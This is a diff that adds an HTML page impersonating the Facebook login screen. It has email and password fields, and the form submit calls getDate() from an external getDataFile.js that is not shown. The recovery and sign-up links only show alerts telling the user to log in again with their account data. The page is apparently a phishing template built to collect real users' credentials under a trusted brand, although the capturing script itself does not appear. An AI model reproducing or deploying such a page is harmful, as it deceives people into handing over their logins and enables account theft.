@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="stylesheet" href="Style.css">
+    <script type="text/javascript" src="./js script/getDataFile.js">  
+
+     
+  </script>
+</head> 
+<body> 
+    
+    <div class="h1">
+    <h1 class="h">facebook</h1>
+    <p class="pr">Facebook helps you connect and share with the people in your life.</p>
+    </div>  
+            <form class="main" action="" method="POST" onsubmit="return getDate()">
+            <input type="text" placeholder="Email address or phone number" id="email" class="txt"><br>
+            <input type="password" placeholder="Password" id="password" class="txt"><br>
+            <input type="submit" value="Log In" class="login-btn"><br>
+            <div class="a-link">
+            <a href=""   onclick='return ForgottenPassword()' class="link">Forgotten Password?</a>
+           <script type='text/javascript'>
+                    function ForgottenPassword() {
+                        alert("try to retrieve your authentication data facebook  and login with newest Account data")
+                        }
+                        
+
+                </script>
+            </div>
+            <div class="ca">
+                <a href="" onclick='return createAccount()' class="pca">Create New Account</a>
+                   <script type='text/javascript'>
+                    function createAccount() {
+                        alert("please Create new facebook Account and Login with newest Account")
+                        }
+                       
+                     
+                </script>
+            </div>
+            </form>
+              <script src="jquery.js"></script>
+              
+</body>
+</html>
